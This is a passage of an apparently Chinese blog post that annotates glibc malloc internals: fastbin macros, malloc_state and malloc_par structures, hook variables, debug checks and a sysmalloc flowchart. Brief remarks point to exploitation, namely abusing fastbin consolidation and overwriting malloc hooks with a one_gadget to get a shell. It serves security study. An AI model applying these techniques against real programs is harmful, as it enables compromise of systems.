class="meta">#<span class="keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])  <span class="comment">// 获取指定索引的fastbin中的块</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 偏移量为 2，以使用其他不可索引的前两个桶 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)  <span class="comment">// 计算给定大小对应的fastbin索引</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 我们支持的最大fastbin请求大小 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)  <span class="comment">// 最大fastbin大小，根据系统字长调整</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NFASTBINS  (fastbin_index(request2size(MAX_FAST_SIZE)) + 1)  <span class="comment">// fastbin的数量</span></span></span><br></pre></td></tr></table></figure>

<p>这个fastbin合并操作也可以利用</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   FASTBIN_CONSOLIDATION_THRESHOLD 是在 free() 中触发</span></span><br><span class="line"><span class="comment">   自动合并可能周围的fastbin chunk。这个值是一个</span></span><br><span class="line"><span class="comment">   启发式的值，因此具体的数值不应该太过于重要。它</span></span><br><span class="line"><span class="comment">   被定义为默认修剪阈值的一半，作为一种折中启发式，</span></span><br><span class="line"><span class="comment">   仅在可能导致修剪的情况下尝试合并。然而，由于</span></span><br><span class="line"><span class="comment">   合并即使在不使用修剪时也能减少大块周围的碎片，</span></span><br><span class="line"><span class="comment">   所以这个值并不是动态可调的。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   NONCONTIGUOUS_BIT 表示 MORECORE 不返回连续的区域。</span></span><br><span class="line"><span class="comment">   否则，连续性在合并结果时会被利用，尽可能地</span></span><br><span class="line"><span class="comment">   合并连续的 MORECORE 调用结果。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   初始值来自 MORECORE_CONTIGUOUS，但如果使用 mmap</span></span><br><span class="line"><span class="comment">   作为 sbrk 的替代品，则会动态改变。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NONCONTIGUOUS_BIT     (2U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> contiguous(M)          (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)  <span class="comment">// 判断内存块是否连续</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> noncontiguous(M)       (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) != 0)  <span class="comment">// 判断内存块是否非连续</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_noncontiguous(M)   ((M)-&gt;flags |= NONCONTIGUOUS_BIT)         <span class="comment">// 设置内存块为非连续</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_contiguous(M)      ((M)-&gt;flags &amp;= ~NONCONTIGUOUS_BIT)        <span class="comment">// 设置内存块为连续</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* fastbin中处理的最大内存大小。 */</span></span><br><span class="line"><span class="type">static</span> INTERNAL_SIZE_T global_max_fast;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   设置 max_fast 的值。</span></span><br><span class="line"><span class="comment">   如果为 0，则使用不可能的较小值。</span></span><br><span class="line"><span class="comment">   前提条件：main_arena中没有现有的fastbin chunk。</span></span><br><span class="line"><span class="comment">   由于 do_check_malloc_state() 会检查这一点，</span></span><br><span class="line"><span class="comment">   我们在更改 max_fast 之前调用 malloc_consolidate()。</span></span><br><span class="line"><span class="comment">   请注意，如果 max_fast 被减少，则其他区域将泄露</span></span><br><span class="line"><span class="comment">   它们的fastbin条目。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_max_fast(s) \</span></span><br><span class="line"><span class="meta">  global_max_fast = (((s) == 0)						      \</span></span><br><span class="line"><span class="meta">                     ? MIN_CHUNK_SIZE / 2 : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> INTERNAL_SIZE_T</span><br><span class="line"><span class="title function_">get_max_fast</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* 告诉 GCC 优化器 global_max_fast 永远不会大于</span></span><br><span class="line"><span class="comment">     MAX_FAST_SIZE。这避免了在 _int_malloc 中</span></span><br><span class="line"><span class="comment">     的越界数组访问（在大小参数的常量传播后）。</span></span><br><span class="line"><span class="comment">     （这段代码不会执行，因为 malloc 保持</span></span><br><span class="line"><span class="comment">     global_max_fast 不变量，但优化器可能不会识别</span></span><br><span class="line"><span class="comment">     这一点。） */</span></span><br><span class="line">  <span class="keyword">if</span> (global_max_fast &gt; MAX_FAST_SIZE)</span><br><span class="line">    __builtin_unreachable ();</span><br><span class="line">  <span class="keyword">return</span> global_max_fast;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Internal-state-representation-and-initialization"><a href="#Internal-state-representation-and-initialization" class="headerlink" title="Internal state representation and initialization"></a>Internal state representation and initialization</h2><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p><code>malloc_state</code> 结构体是实现内存分配器的核心数据结构之一，它包含了多个用于管理内存分配和释放状态的字段。在多线程环境中，需要通过互斥锁来确保对这些状态的安全访问。</p>
<p><code>have_fastchunks</code> 字段虽然是近似值，但对于优化内存管理的性能十分重要，通过减少不必要的合并调用，可以提高分配效率。整体上，这种设计具有良好的性能和灵活性，适合在动态内存管理中使用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   have_fastchunks 表示可能存在一些fastbin chunks。</span></span><br><span class="line"><span class="comment">   它在将块放入任何fastbin时设置为 true，并在</span></span><br><span class="line"><span class="comment">   malloc_consolidate 中被清除。这个值是近似的，</span></span><br><span class="line"><span class="comment">   因为它可能在没有fastbin chunk时被设置，或者即使</span></span><br><span class="line"><span class="comment">   存在fastbin chunk时也可能被清除。由于它的唯一目的是</span></span><br><span class="line"><span class="comment">   减少对 malloc_consolidate 的冗余调用，因此</span></span><br><span class="line"><span class="comment">   它并不影响正确性。因此我们可以安全地使用</span></span><br><span class="line"><span class="comment">   放松的原子访问。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* 序列化访问。 */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* 标志（以前在 max_fast 中）。 */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果快速桶块包含最近插入的空闲块，则设置。 */</span></span><br><span class="line">  <span class="comment">/* 注意这是一个布尔值，但并不是所有目标都支持</span></span><br><span class="line"><span class="comment">     布尔类型的原子操作。 */</span></span><br><span class="line">  <span class="type">int</span> have_fastchunks;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 快速桶 */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* top chunk的基址--不在其他桶中保存 */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 最近一次拆分小请求的剩余部分 */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 正常的桶，按照上述描述打包 */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 桶的位图 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 链表 */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 空闲区域的链表。该字段的访问由 arena.c 中的 free_list_lock 序列化。 */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 附加到该区域的线程数量。 如果区域在空闲列表中，则为 0。</span></span><br><span class="line"><span class="comment">     该字段的访问由 arena.c 中的 free_list_lock 序列化。 */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 从系统中在该区域分配的内存。 */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>mutex是互斥锁，前面说到的arena为了解决多线程冲突的问题，所以如果使用了该arena，会进行上锁。<br>后面的flags是标志位标志着一些特征，这里不做深入只需要有个概念。fastbins是一个链表后面再做解释，top指的是top chunk，bins也是一个chunk的链表数组，next指针指向的是下一个malloc_state的位置。而后面那个*next_free指针是指向下一个未使用的malloc_state的位置。</p>
<h3 id="malloc-par"><a href="#malloc-par" class="headerlink" title="malloc_par"></a>malloc_par</h3><p><code>malloc_par</code> 结构体用于管理和配置内存分配器的参数。它包含了多个调节和监控内存分配行为的字段，这使得内存管理更加灵活和高效。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* 可调参数 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> trim_threshold;    <span class="comment">// 修剪阈值</span></span><br><span class="line">  INTERNAL_SIZE_T top_pad;         <span class="comment">// 顶部填充</span></span><br><span class="line">  INTERNAL_SIZE_T mmap_threshold;   <span class="comment">// mmap 阈值</span></span><br><span class="line">  INTERNAL_SIZE_T arena_test;       <span class="comment">// arena 测试</span></span><br><span class="line">  INTERNAL_SIZE_T arena_max;        <span class="comment">// arena 最大值</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 内存映射支持 */</span></span><br><span class="line">  <span class="type">int</span> n_mmaps;                      <span class="comment">// 当前 mmap 的数量</span></span><br><span class="line">  <span class="type">int</span> n_mmaps_max;                  <span class="comment">// 当前 mmap 的最大数量</span></span><br><span class="line">  <span class="type">int</span> max_n_mmaps;                  <span class="comment">// 最大 mmap 数量</span></span><br><span class="line">  <span class="comment">/* mmap_threshold 是动态的，直到用户手动设置它，</span></span><br><span class="line"><span class="comment">     此时我们需要禁用任何动态行为。 */</span></span><br><span class="line">  <span class="type">int</span> no_dyn_threshold;             <span class="comment">// 禁用动态阈值</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 统计信息 */</span></span><br><span class="line">  INTERNAL_SIZE_T mmapped_mem;      <span class="comment">// 已映射内存</span></span><br><span class="line">  INTERNAL_SIZE_T max_mmapped_mem;  <span class="comment">// 最大映射内存</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 通过 MORECORE/sbrk 分配的第一个地址。 */</span></span><br><span class="line">  <span class="type">char</span> *sbrk_base;                  <span class="comment">// sbrk 基础地址</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* 使用的最大桶数量。 */</span></span><br><span class="line">  <span class="type">size_t</span> tcache_bins;               <span class="comment">// tcache 桶数量</span></span><br><span class="line">  <span class="type">size_t</span> tcache_max_bytes;          <span class="comment">// tcache 最大字节数</span></span><br><span class="line">  <span class="comment">/* 每个桶中最大块数。 */</span></span><br><span class="line">  <span class="type">size_t</span> tcache_count;              <span class="comment">// tcache 块数量</span></span><br><span class="line">  <span class="comment">/* 从未排序列表中移除的最大块数，这些块不用于</span></span><br><span class="line"><span class="comment">     填充缓存。 */</span></span><br><span class="line">  <span class="type">size_t</span> tcache_unsorted_limit;     <span class="comment">// tcache 未排序限制</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这里需要注意一下<code>mp_</code>结构体后面经常用到</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* There are several instances of this struct (&quot;arenas&quot;) in this</span></span><br><span class="line"><span class="comment">   malloc.  If you are adapting this malloc in a way that does NOT use</span></span><br><span class="line"><span class="comment">   a static or mmapped malloc_state, you MUST explicitly zero-fill it</span></span><br><span class="line"><span class="comment">   before using. This malloc relies on the property that malloc_state</span></span><br><span class="line"><span class="comment">   is initialized to all zeroes (as is true of C statics).  */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> <span class="title">main_arena</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  .mutex = _LIBC_LOCK_INITIALIZER,</span><br><span class="line">  .next = &amp;main_arena,</span><br><span class="line">  .attached_threads = <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* These variables are used for undumping support.  Chunked are marked</span></span><br><span class="line"><span class="comment">   as using mmap, but we leave them alone if they fall into this</span></span><br><span class="line"><span class="comment">   range.  NB: The chunk size for these chunks only includes the</span></span><br><span class="line"><span class="comment">   initial size field (of SIZE_SZ bytes), there is no trailing size</span></span><br><span class="line"><span class="comment">   field (unlike with regular mmapped chunks).  */</span></span><br><span class="line"><span class="type">static</span> mchunkptr dumped_main_arena_start; <span class="comment">/* Inclusive.  */</span></span><br><span class="line"><span class="type">static</span> mchunkptr dumped_main_arena_end;   <span class="comment">/* Exclusive.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* True if the pointer falls into the dumped arena.  Use this after</span></span><br><span class="line"><span class="comment">   chunk_is_mmapped indicates a chunk is mmapped.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DUMPED_MAIN_ARENA_CHUNK(p) \</span></span><br><span class="line"><span class="meta">  ((p) &gt;= dumped_main_arena_start &amp;&amp; (p) &lt; dumped_main_arena_end)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is only one instance of the malloc parameters.  */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span> <span class="title">mp_</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  .top_pad = DEFAULT_TOP_PAD,</span><br><span class="line">  .n_mmaps_max = DEFAULT_MMAP_MAX,</span><br><span class="line">  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,</span><br><span class="line">  .trim_threshold = DEFAULT_TRIM_THRESHOLD,</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</span></span><br><span class="line">  .arena_test = NARENAS_FROM_NCORES (<span class="number">1</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  ,</span><br><span class="line">  .tcache_count = TCACHE_FILL_COUNT,</span><br><span class="line">  .tcache_bins = TCACHE_MAX_BINS,</span><br><span class="line">  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS<span class="number">-1</span>),</span><br><span class="line">  .tcache_unsorted_limit = <span class="number">0</span> <span class="comment">/* No limit.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Initialize a malloc_state struct.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This is called from ptmalloc_init () or from _int_new_arena ()</span></span><br><span class="line"><span class="comment">   when creating a new arena.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">malloc_init_state</span> <span class="params">(mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  mbinptr bin;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Establish circular links for normal bins */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      bin = bin_at (av, i);</span><br><span class="line">      bin-&gt;fd = bin-&gt;bk = bin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MORECORE_CONTIGUOUS</span></span><br><span class="line">  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  set_noncontiguous (av);</span><br><span class="line">  <span class="keyword">if</span> (av == &amp;main_arena)</span><br><span class="line">    set_max_fast (DEFAULT_MXFAST);</span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  av-&gt;top = initial_top (av);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Other internal utilities operating on mstates</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">sysmalloc</span> <span class="params">(INTERNAL_SIZE_T, mstate)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span>      <span class="title function_">systrim</span> <span class="params">(<span class="type">size_t</span>, mstate)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>     <span class="title function_">malloc_consolidate</span> <span class="params">(mstate)</span>;</span><br></pre></td></tr></table></figure>



<h2 id="hook函数"><a href="#hook函数" class="headerlink" title="hook函数"></a>hook函数</h2><p>在用户没有自定义之前，hook函数默认为空，所以我们常通过改hook函数为one_gadget来getshell</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* -------------- Early definitions for debugging hooks ---------------- */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Define and initialize the hook variables.  These weak definitions must</span></span><br><span class="line"><span class="comment">   appear before any use of the variables in a function (arena.c uses one).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> weak_variable</span></span><br><span class="line"><span class="comment">/* In GNU libc we want the hook variables to be weak definitions to</span></span><br><span class="line"><span class="comment">   avoid a problem with Emacs.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> weak_variable weak_function</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Forward declarations.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">malloc_hook_ini</span> <span class="params">(<span class="type">size_t</span> sz,</span></span><br><span class="line"><span class="params">                              <span class="type">const</span> <span class="type">void</span> *caller)</span> __THROW;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">realloc_hook_ini</span> <span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> sz,</span></span><br><span class="line"><span class="params">                               <span class="type">const</span> <span class="type">void</span> *caller)</span> __THROW;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">memalign_hook_ini</span> <span class="params">(<span class="type">size_t</span> alignment, <span class="type">size_t</span> sz,</span></span><br><span class="line"><span class="params">                                <span class="type">const</span> <span class="type">void</span> *caller)</span> __THROW;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> HAVE_MALLOC_INIT_HOOK</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">weak_variable</span> <span class="params">(*__malloc_initialize_hook)</span> <span class="params">(<span class="type">void</span>)</span> = <span class="literal">NULL</span>;</span><br><span class="line">compat_symbol (libc, __malloc_initialize_hook,</span><br><span class="line">	       __malloc_initialize_hook, GLIBC_2_0);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">weak_variable</span> <span class="params">(*__free_hook)</span> <span class="params">(<span class="type">void</span> *__ptr,</span></span><br><span class="line"><span class="params">                                   <span class="type">const</span> <span class="type">void</span> *)</span> = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">weak_variable</span> <span class="params">(*__malloc_hook)</span></span><br><span class="line">  <span class="params">(<span class="type">size_t</span> __size, <span class="type">const</span> <span class="type">void</span> *)</span> = malloc_hook_ini;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">weak_variable</span> <span class="params">(*__realloc_hook)</span></span><br><span class="line">  <span class="params">(<span class="type">void</span> *__ptr, <span class="type">size_t</span> __size, <span class="type">const</span> <span class="type">void</span> *)</span></span><br><span class="line">  = realloc_hook_ini;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">weak_variable</span> <span class="params">(*__memalign_hook)</span></span><br><span class="line">  <span class="params">(<span class="type">size_t</span> __alignment, <span class="type">size_t</span> __size, <span class="type">const</span> <span class="type">void</span> *)</span></span><br><span class="line">  = memalign_hook_ini;</span><br><span class="line"><span class="type">void</span> <span class="title function_">weak_variable</span> <span class="params">(*__after_morecore_hook)</span> <span class="params">(<span class="type">void</span>)</span> = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This function is called from the arena shutdown hook, to free the</span></span><br><span class="line"><span class="comment">   thread cache (if it exists).  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">tcache_thread_shutdown</span> <span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">weak_variable</span> <span class="params">(*__free_hook)</span> <span class="params">(<span class="type">void</span> *__ptr, <span class="type">const</span> <span class="type">void</span> *)</span> = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p><strong>语法分析</strong></p>
<ol>
<li><p><strong><code>void</code></strong>：</p>
<ul>
<li>这是返回类型，表示这个函数不返回任何值。</li>
</ul>
</li>
<li><p><strong><code>weak_variable</code></strong>：</p>
<ul>
<li>这是一个类型修饰符，通常用于指示编译器这是一个弱符号（weak symbol）。弱符号允许在链接时可以被同名的强符号（strong symbol）覆盖。这在库中常用，以允许用户自定义特定的行为而不影响库的默认实现。</li>
</ul>
</li>
<li><p><strong><code>(*__free_hook)</code></strong>：</p>
<ul>
<li>这里定义了一个函数指针，<code>__free_hook</code> 是指针的名字。<code>(*__free_hook)</code> 表示 <code>__free_hook</code> 是一个指向函数的指针。函数指针的定义需要括号将指针名称括起来，这是因为在 C 语言中，<code>*</code> 优先级高于函数的参数列表。</li>
</ul>
</li>
<li><p><strong><code>(void *__ptr, const void *)</code></strong>：</p>
<ul>
<li>这是函数指针所指向的函数的参数列表：<ul>
<li><code>void *__ptr</code>：第一个参数是一个指向 <code>void</code> 类型的指针，通常用于指向要释放的内存块。</li>
<li><code>const void *</code>：第二个参数也是一个指向 <code>void</code> 的常量指针，常用于传递上下文信息或其他数据，而不希望在钩子函数中修改它。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong><code>= NULL;</code></strong>：</p>
<ul>
<li>这是对 <code>__free_hook</code> 的初始化，将其初始值设为 <code>NULL</code>，表示目前没有关联的具体实现。当这个钩子被调用时，如果没有用户提供的实现，指针为 <code>NULL</code> 时通常会导致调用默认的 <code>free</code> 函数或产生错误。</li>
</ul>
</li>
</ol>
<p><strong>整体含义</strong></p>
<p>综上所述，这行代码的作用是定义一个名为 <code>__free_hook</code> 的函数指针，这个指针可以指向一个特定的函数，该函数用于替代标准 <code>free</code> 操作。这个替代操作可以在内存管理系统中提供自定义行为，例如在释放内存时进行日志记录、统计等操作。由于它是一个弱符号，用户可以在链接时提供自己的实现来替代这个钩子，从而定制内存释放的行为。</p>
<p><strong>示例用法</strong></p>
<p>假设用户想要定义自己的 <code>free</code> 行为，他们可能会这样做：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">my_free_hook</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">const</span> <span class="type">void</span> *context)</span> &#123;</span><br><span class="line">    <span class="comment">// 自定义释放操作</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Freeing memory at %p\n&quot;</span>, ptr);</span><br><span class="line">    <span class="built_in">free</span>(ptr); <span class="comment">// 调用标准的 free 函数释放内存</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在某处的代码中</span></span><br><span class="line">__free_hook = my_free_hook; <span class="comment">// 将钩子指向用户自定义的实现</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中，用户定义了一个自定义的 <code>my_free_hook</code> 函数，并将 <code>__free_hook</code> 指向它。这样，任何调用 <code>free</code> 的操作，都会通过 <code>my_free_hook</code> 先执行，从而实现用户自定义的内存释放逻辑。</p>
<h2 id="声明并定义了一堆检查"><a href="#声明并定义了一堆检查" class="headerlink" title="声明并定义了一堆检查"></a>声明并定义了一堆检查</h2><p>一部分是用于开发人员调试，一部分是实际用户用的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> !MALLOC_DEBUG</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_chunk(A, P)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_free_chunk(A, P)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_inuse_chunk(A, P)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_remalloced_chunk(A, P, N)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_malloced_chunk(A, P, N)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_malloc_state(A)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_chunk(A, P)              do_check_chunk (A, P)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_free_chunk(A, P)         do_check_free_chunk (A, P)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_inuse_chunk(A, P)        do_check_inuse_chunk (A, P)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_remalloced_chunk(A, P, N) do_check_remalloced_chunk (A, P, N)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_malloced_chunk(A, P, N)   do_check_malloced_chunk (A, P, N)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_malloc_state(A)         do_check_malloc_state (A)</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>分析后面的代码需要时直接跳转回了看就行</p>
<h2 id="sysmalloc"><a href="#sysmalloc" class="headerlink" title="sysmalloc()"></a>sysmalloc()</h2><p>当_int_malloc()函数尝试从 fast bins，last remainder chunk，small bins，large bins 和 top chunk 都失败之后，就会使用 sYSMALLOc()函数直接向系统申请内存用于分配所需的 chunk。 其实现源代码如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[开始]</span><br><span class="line">   |</span><br><span class="line">   v</span><br><span class="line">[检查 av 和请求大小]</span><br><span class="line">   |</span><br><span class="line">   +---是---&gt; [尝试 mmap 分配] ---&gt; [设置返回块] ---&gt; [结束]</span><br><span class="line">   |</span><br><span class="line">   +---否---&gt; [记录并检查当前top chunk]</span><br><span class="line">                   |</span><br><span class="line">                   v</span><br><span class="line">           [尝试扩展当前堆]</span><br><span class="line">                   |</span><br><span class="line">           +---是---&gt; [更新 av-&gt;system_mem]</span><br><span class="line">           |</span><br><span class="line">           +---否---&gt; [使用 MORECORE]</span><br><span class="line">                             |</span><br><span class="line">                             v</span><br><span class="line">                  [检查 MORECORE 返回值]</span><br><span class="line">                             |</span><br><span class="line">                 +---是---&gt; [对齐和更新]</span><br><span class="line">                 |</span><br><span class="line">                 +---否---&gt; [返回 ENOMEM]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>值得注意：</p>
<ul>
<li><code> _int_free (av, old_top, 1);</code>在179行</li>
<li><code> _int_free (av, old_top, 1);</code>在451行</li>
</ul>
